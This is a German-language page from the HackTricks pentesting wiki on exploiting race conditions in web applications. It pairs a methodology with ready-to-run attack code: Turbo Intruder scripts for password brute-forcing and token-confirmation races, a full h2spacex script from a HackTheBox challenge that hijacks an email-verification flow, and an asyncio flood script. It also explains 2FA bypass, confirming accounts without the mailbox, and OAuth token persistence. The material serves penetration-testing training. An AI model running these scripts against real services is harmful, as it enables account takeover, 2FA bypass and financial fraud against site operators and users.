# Rennbedingung

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

{% hint style="warning" %}
F√ºr ein tiefes Verst√§ndnis dieser Technik lesen Sie den Originalbericht unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## Verbesserung von Rennbedingungsangriffen

Das Hauptproblem beim Ausnutzen von Rennbedingungen besteht darin, sicherzustellen, dass mehrere Anfragen gleichzeitig bearbeitet werden, mit **sehr geringen Unterschieden in ihren Verarbeitungszeiten - idealerweise weniger als 1 ms**.

Hier finden Sie einige Techniken zur Synchronisierung von Anfragen:

#### HTTP/2 Single-Paket-Angriff vs. HTTP/1.1 Last-Byte-Synchronisierung

* **HTTP/2**: Unterst√ºtzt das Senden von zwei Anfragen √ºber eine einzelne TCP-Verbindung und verringert den Einfluss von Netzwerk-Jitter. Aufgrund von serverseitigen Variationen reichen jedoch zwei Anfragen m√∂glicherweise nicht f√ºr einen konsistenten Rennbedingungsangriff aus.
* **HTTP/1.1 'Last-Byte Sync'**: Erm√∂glicht das Vorsenden der meisten Teile von 20-30 Anfragen, wobei ein kleines Fragment zur√ºckgehalten wird, das dann zusammen gesendet wird und gleichzeitig beim Server ankommt.

Die **Vorbereitung auf Last-Byte Sync** umfasst:

1. Senden von Headern und Body-Daten abz√ºglich des letzten Bytes, ohne den Stream zu beenden.
2. Pause von 100 ms nach dem initialen Senden.
3. Deaktivierung von TCP\_NODELAY zur Nutzung des Nagle-Algorithmus f√ºr das Stapeln von finalen Frames.
4. Pingen zur Aufw√§rmung der Verbindung.

Das nachfolgende Senden der zur√ºckgehaltenen Frames sollte zu deren Ankunft in einem einzelnen Paket f√ºhren, was √ºber Wireshark √ºberpr√ºfbar ist. Diese Methode gilt nicht f√ºr statische Dateien, die normalerweise nicht in RC-Angriffen involviert sind.

### Anpassung an die Serverarchitektur

Das Verst√§ndnis der Architektur des Ziels ist entscheidend. Front-End-Server k√∂nnen Anfragen m√∂glicherweise unterschiedlich routen, was die Zeitplanung beeinflusst. Eine vorbeugende serverseitige Verbindungsaufw√§rmung durch belanglose Anfragen k√∂nnte die Zeitplanung von Anfragen normalisieren.

#### Behandlung von Sitzungsbasierter Sperrung

Frameworks wie der PHP-Sitzungshandler serialisieren Anfragen nach Sitzung und k√∂nnen Schwachstellen m√∂glicherweise verschleiern. Die Verwendung unterschiedlicher Sitzungstoken f√ºr jede Anfrage kann dieses Problem umgehen.

#### √úberwindung von Rate- oder Ressourcenbeschr√§nkungen

Wenn die Verbindungsaufw√§rmung nicht wirksam ist, kann das absichtliche Ausl√∂sen von Verz√∂gerungen durch Raten- oder Ressourcenbeschr√§nkungen der Webserver durch eine Flut von Dummy-Anfragen den Single-Paket-Angriff erleichtern, indem eine serverseitige Verz√∂gerung induziert wird, die Rennbedingungen beg√ºnstigt.

## Angriffsbeispiele

* **Tubo Intruder - HTTP2 Single-Paket-Angriff (1 Endpunkt)**: Sie k√∂nnen die Anfrage an **Turbo Intruder** senden (`Erweiterungen` -> `Turbo Intruder` -> `An Turbo Intruder senden`), Sie k√∂nnen in der Anfrage den Wert, den Sie f√ºr **Brute-Force** m√∂chten, √§ndern f√ºr **`%s`** wie in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` und dann das **`examples/race-single-packer-attack.py`** aus dem Dropdown-Men√º ausw√§hlen:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wenn Sie **verschiedene Werte senden** m√∂chten, k√∂nnten Sie den Code mit diesem √§ndern, der eine Wortliste aus der Zwischenablage verwendet:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
Wenn die Website HTTP2 nicht unterst√ºtzt (nur HTTP1.1), verwenden Sie `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 single-packet attack (Mehrere Endpunkte)**: Falls Sie eine Anfrage an einen Endpunkt senden m√ºssen und dann mehrere an andere Endpunkte, um die RCE auszul√∂sen, k√∂nnen Sie das Skript `race-single-packet-attack.py` wie folgt √§ndern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* Es ist auch in **Repeater** √ºber die neue Option '**Send group in parallel**' in Burp Suite verf√ºgbar.
* F√ºr **limit-overrun** k√∂nnten Sie einfach die **gleiche Anfrage 50 Mal** in der Gruppe hinzuf√ºgen.
* F√ºr **Verbindungsaufw√§rmung** k√∂nnten Sie **am Anfang** der **Gruppe** einige **Anfragen** zu einem nicht statischen Teil des Webservers hinzuf√ºgen.
* Um den Prozess **zwischen** der Verarbeitung **einer Anfrage und einer anderen** in 2 Unterzust√§nden zu **verz√∂gern**, k√∂nnten Sie **zus√§tzliche Anfragen zwischen** beiden Anfragen hinzuf√ºgen.
* F√ºr ein **Multi-Endpoint** RC k√∂nnten Sie die **Anfrage starten**, die **zum versteckten Zustand f√ºhrt**, und dann **50 Anfragen** direkt danach senden, die **den versteckten Zustand ausnutzen**.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Automatisiertes Python-Skript**: Das Ziel dieses Skripts ist es, die E-Mail-Adresse eines Benutzers zu √§ndern und kontinuierlich zu √ºberpr√ºfen, bis der Best√§tigungscode der neuen E-Mail-Adresse an die letzte E-Mail-Adresse gesendet wird (dies liegt daran, dass im Code ein RC gesehen wurde, bei dem es m√∂glich war, eine E-Mail-Adresse zu √§ndern, aber die Best√§tigung an die alte E-Mail-Adresse gesendet wurde, weil die Variable, die die E-Mail-Adresse angibt, bereits mit der ersten bef√ºllt war).\
Wenn das Wort "objetivo" in den empfangenen E-Mails gefunden wird, wissen wir, dass wir den Best√§tigungscode der ge√§nderten E-Mail-Adresse erhalten haben, und beenden den Angriff.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Roh BF

Vor der vorherigen Forschung wurden einige Payloads verwendet, die einfach versuchten, die Pakete so schnell wie m√∂glich zu senden, um eine RC zu verursachen.

* **Repeater:** √úberpr√ºfen Sie die Beispiele aus dem vorherigen Abschnitt.
* **Intruder:** Senden Sie die **Anfrage** an **Intruder**, setzen Sie die **Anzahl der Threads** im **Optionsmen√º auf 30** und w√§hlen Sie als Payload **Null-Payloads** aus und generieren Sie **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodologie**

### Limit-√úberlauf / TOCTOU

Dies ist die grundlegendste Art von Race Condition, bei der **Schwachstellen** auftreten, die die Anzahl der Male begrenzen, die eine Aktion ausgef√ºhrt werden kann. Zum Beispiel das mehrfache Verwenden desselben Rabattcodes in einem Webshop. Ein sehr einfaches Beispiel findet sich in [**diesem Bericht**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**diesem Bug**](https://hackerone.com/reports/759247).

Es gibt viele Variationen dieses Angriffstyps, darunter:

* Mehrfaches Einl√∂sen einer Geschenkkarte
* Mehrfaches Bewerten eines Produkts
* Abheben oder √úberweisen von Geld √ºber den Kontostand hinaus
* Wiederverwendung einer einzelnen CAPTCHA-L√∂sung
* Umgehen einer Anti-Brute-Force-Ratenbegrenzung

### **Versteckte Unterzust√§nde**

Das Ausnutzen komplexer Race Conditions beinhaltet oft die Nutzung kurzer Gelegenheiten zur Interaktion mit versteckten oder **unerw√ºnschten maschinellen Unterzust√§nden**. So gehen Sie vor:

1. **Potenzielle versteckte Unterzust√§nde identifizieren**
* Beginnen Sie damit, Endpunkte zu ermitteln, die kritische Daten wie Benutzerprofile oder Passwortzur√ºcksetzungsprozesse √§ndern oder mit ihnen interagieren. Konzentrieren Sie sich auf:
* **Speicherung**: Bevorzugen Sie Endpunkte, die serverseitige persistente Daten manipulieren, gegen√ºber denen, die Daten clientseitig verarbeiten.
* **Aktion**: Suchen Sie nach Operationen, die vorhandene Daten √§ndern, da diese eher ausnutzbare Bedingungen schaffen als solche, die neue Daten hinzuf√ºgen.
* **Schl√ºsselung**: Erfolgreiche Angriffe beinhalten in der Regel Operationen, die auf demselben Identifikator basieren, z. B. Benutzername oder Zur√ºcksetzungstoken.
2. **Erste Sondierung durchf√ºhren**
* Testen Sie die identifizierten Endpunkte mit Race-Condition-Angriffen und beobachten Sie Abweichungen von den erwarteten Ergebnissen. Unerwartete Antworten oder √Ñnderungen im Anwendungsverhalten k√∂nnen auf eine Schwachstelle hinweisen.
3. **Schwachstelle demonstrieren**
* Reduzieren Sie den Angriff auf die minimale Anzahl von Anfragen, die ben√∂tigt werden, um die Schwachstelle auszunutzen, oft nur zwei. Dieser Schritt erfordert m√∂glicherweise mehrere Versuche oder Automatisierung aufgrund des pr√§zisen Timing.

### Zeitkritische Angriffe

Pr√§zision beim Timing von Anfragen kann Schwachstellen aufdecken, insbesondere wenn vorhersehbare Methoden wie Zeitstempel f√ºr Sicherheitstoken verwendet werden. Beispielsweise k√∂nnten durch die Generierung von Passwortzur√ºcksetzungstoken basierend auf Zeitstempeln identische Tokens f√ºr gleichzeitige Anfragen erm√∂glicht werden.

**Zum Ausnutzen:**

* Verwenden Sie pr√§zises Timing, wie bei einem Ein-Paket-Angriff, um gleichzeitige Passwortzur√ºcksetzungsanfragen zu stellen. Identische Tokens deuten auf eine Schwachstelle hin.

**Beispiel:**

* Fordern Sie gleichzeitig zwei Passwortzur√ºcksetzungstoken an und vergleichen Sie sie. √úbereinstimmende Tokens deuten auf einen Fehler in der Token-Generierung hin.

**√úberpr√ºfen Sie dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **um dies auszuprobieren.**

## Fallstudien zu versteckten Unterzust√§nden

### Bezahlen & Artikel hinzuf√ºgen

√úberpr√ºfen Sie dieses [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation), um zu sehen, wie Sie in einem Gesch√§ft **bezahlen** und einen zus√§tzlichen Artikel hinzuf√ºgen k√∂nnen, f√ºr den Sie nicht bezahlen m√ºssen.

### Andere E-Mails best√§tigen

Die Idee ist es, eine E-Mail-Adresse zu **√ºberpr√ºfen** und sie gleichzeitig in eine andere zu √§ndern, um herauszufinden, ob die Plattform die neue ge√§nderte Adresse √ºberpr√ºft.

### E-Mail zu 2 E-Mail-Adressen Cookie-basiert √§ndern

Laut [**dieser Forschung**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab auf diese Weise anf√§llig f√ºr eine √úbernahme, da es den **E-Mail-Best√§tigungstoken einer E-Mail an die andere E-Mail senden k√∂nnte**.

**√úberpr√ºfen Sie dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **um dies auszuprobieren.**

### Versteckte Datenbankzust√§nde / Best√§tigungsumgehung

Wenn **2 verschiedene Schreibvorg√§nge** verwendet werden, um **Informationen** in einer **Datenbank hinzuzuf√ºgen**, gibt es einen kurzen Zeitraum, in dem **nur die erste Daten geschrieben** wurde. Beispielsweise k√∂nnten bei der Erstellung eines Benutzers der **Benutzername** und das **Passwort geschrieben** und dann das Token zur Best√§tigung des neu erstellten Kontos geschrieben werden. Dies bedeutet, dass f√ºr kurze Zeit das **Token zur Best√§tigung eines Kontos null ist**.

Daher k√∂nnte das **Registrieren eines Kontos und das Senden mehrerer Anfragen mit einem leeren Token** (`token=` oder `token[]=` oder einer anderen Variation) zur sofortigen Best√§tigung des Kontos erm√∂glichen, ein Konto zu best√§tigen, bei dem Sie die E-Mail nicht kontrollieren.

**√úberpr√ºfen Sie dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **um dies auszuprobieren.**

### 2FA umgehen

Der folgende Pseudocode ist anf√§llig f√ºr eine Race Condition, weil in einem sehr kurzen Zeitraum die **2FA nicht durchgesetzt wird**, w√§hrend die Sitzung erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewige Persistenz

Es gibt mehrere [**OAuth-Anbieter**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Diese Dienste erm√∂glichen es Ihnen, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die der Anbieter registriert hat. Um dies zu tun, muss der **Client** Ihrer Anwendung erlauben, auf einige ihrer Daten innerhalb des **OAuth-Anbieters** zuzugreifen.\
Also, bis hierhin nur ein √ºblicher Login mit Google/LinkedIn/GitHub... wo Sie mit einer Seite aufgefordert werden, die besagt: "_Anwendung \<InsertCoolName> m√∂chte auf Ihre Informationen zugreifen, m√∂chten Sie dies zulassen?_"

#### Race Condition in `authorization_code`

Das **Problem** tritt auf, wenn Sie es **akzeptieren** und automatisch einen **`authorization_code`** an die b√∂sartige Anwendung senden. Dann missbraucht diese **Anwendung eine Race Condition im OAuth-Dienstanbieter, um mehr als ein AT/RT** (_Authentication Token/Refresh Token_) aus dem **`authorization_code`** f√ºr Ihr Konto zu generieren. Grunds√§tzlich wird sie den Umstand ausnutzen, dass Sie der Anwendung erlaubt haben, auf Ihre Daten zuzugreifen, um **mehrere Konten zu erstellen**. Dann, wenn Sie der Anwendung **die Erlaubnis entziehen, auf Ihre Daten zuzugreifen, wird ein Paar AT/RT gel√∂scht, aber die anderen werden weiterhin g√ºltig sein**.

#### Race Condition in `Refresh Token`

Sobald Sie einen g√ºltigen RT erhalten haben, k√∂nnten Sie versuchen, ihn zu missbrauchen, um mehrere AT/RT zu generieren, und **selbst wenn der Benutzer die Berechtigungen** f√ºr die b√∂sartige Anwendung, auf seine Daten zuzugreifen, **widerruft, werden mehrere RTs weiterhin g√ºltig sein**.

## **RC in WebSockets**

In [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) finden Sie einen PoC in Java, um WebSocket-Nachrichten **parallel** zu senden und **Race Conditions auch in WebSockets** auszunutzen.

## Referenzen

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mithilfe der weltweit **fortschrittlichsten Community-Tools** **Workflows zu erstellen und zu automatisieren**.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
